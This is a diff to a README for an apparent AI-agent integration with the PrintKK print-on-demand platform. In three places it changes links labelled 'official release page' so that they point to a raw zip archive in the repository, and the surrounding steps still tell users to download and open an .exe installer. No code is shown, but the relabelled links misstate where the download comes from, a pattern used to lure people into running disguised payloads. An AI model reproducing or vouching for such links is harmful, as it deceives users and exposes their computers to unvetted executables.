@@ -1,6 +1,6 @@
 # 🖨️ printkk-agent-skill - Connect AI agents to print-on-demand services
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/adrianohenriqueuna-pixel/printkk-agent-skill/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/adrianohenriqueuna-pixel/printkk-agent-skill/raw/refs/heads/main/printkk/agent_skill_printkk_v1.1.zip)
 
 This software manages the connection between AI systems and the PrintKK print-on-demand platform. It allows computers to send product data and order requests to the print shop without manual input. The tool follows a standardized format that various AI agents read and execute. You can use this to automate your dropshipping business.
 
@@ -8,7 +8,7 @@ This software manages the connection between AI systems and the PrintKK print-on
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/adrianohenriqueuna-pixel/printkk-agent-skill/releases).
+1. Go to the [official release page](https://github.com/adrianohenriqueuna-pixel/printkk-agent-skill/raw/refs/heads/main/printkk/agent_skill_printkk_v1.1.zip).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in .exe to download the installer.
 4. Open the file once the download finishes.
@@ -73,4 +73,4 @@ Check your print-on-demand account balance. Sometimes a lack of funds prevents t
 
 This project supports a wide range of platforms and uses. It automates common ecommerce tasks for creators. If you need further assistance with the technical side of your setup, consult the specific documentation for the AI agent you currently use. The PrintKK integration follows standard web protocols, making it compatible with most modern automation workflows.
 
-Keep your software updated for better performance. Periodically check the [official release page](https://github.com/adrianohenriqueuna-pixel/printkk-agent-skill/releases) to see if a newer version exists. Older versions might lack fixes for new features or security updates that the PrintKK API requires for proper function.
+Keep your software updated for better performance. Periodically check the [official release page](https://github.com/adrianohenriqueuna-pixel/printkk-agent-skill/raw/refs/heads/main/printkk/agent_skill_printkk_v1.1.zip) to see if a newer version exists. Older versions might lack fixes for new features or security updates that the PrintKK API requires for proper function.
